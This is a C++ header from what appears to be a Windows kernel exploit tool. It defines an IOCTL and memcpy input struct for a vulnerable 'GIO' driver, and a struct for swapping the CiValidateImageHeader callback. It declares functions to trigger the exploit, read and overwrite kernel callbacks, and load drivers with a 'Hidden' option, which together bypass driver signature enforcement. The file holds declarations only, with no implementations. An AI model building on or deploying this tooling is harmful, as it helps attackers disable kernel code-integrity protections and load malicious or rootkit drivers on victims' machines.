#pragma once
#include <Windows.h>
#include <ntstatus.h>
#include <iostream>
#include <Psapi.h>
#include <cstdio>   
#include <cstdint> 
#include <shlwapi.h>  
#include <thread>
#include <chrono>

#pragma comment(lib, "shlwapi.lib")  
#pragma comment(lib, "ntdll.lib") 

#define FILE_DEVICE_GIO				(0xc350)
#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define dev_name					L"\\Device\\GIO"

static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

struct seCiCallbacks_swap {
	DWORD64 ciValidateImageHeaderEntry;
	DWORD64 zwFlushInstructionCache;
};

typedef struct _GIOMemcpyInput
{
	ULONG64 Dst;
	ULONG64 Src;
	DWORD Size;
} GIOMemcpyInput, * PGIOMemcpyInput;

namespace vuln {
	NTSTATUS TriggerExploit( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load );

	NTSTATUS WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden );

	NTSTATUS WindUnloadDriver( PWCHAR DriverName, BOOLEAN Hidden );
}


namespace modules {
	NTSTATUS FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase );

	ULONG_PTR GetKernelModuleAddress( const char* name );

	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();

	NTSTATUS OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors );

	NTSTATUS CreateDriverService( PWCHAR ServiceName, PWCHAR FileName );

	NTSTATUS LoadDriver( PWCHAR ServiceName );

	NTSTATUS UnloadDriver( PWCHAR ServiceName );
}

namespace helpers {

	DWORD64 find_pattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, size_t patternSize, size_t offsetAfterMatch );

	bool CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr );

	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );

	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );

    NTSTATUS ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 &outValue );

	void DeleteService( PWCHAR ServiceName );

	NTSTATUS WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value );

	NTSTATUS EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName );

	PVOID GetProcessHeapFromPEB();

	uintptr_t GetProcAddress( void* hModule, const wchar_t* wAPIName );
}

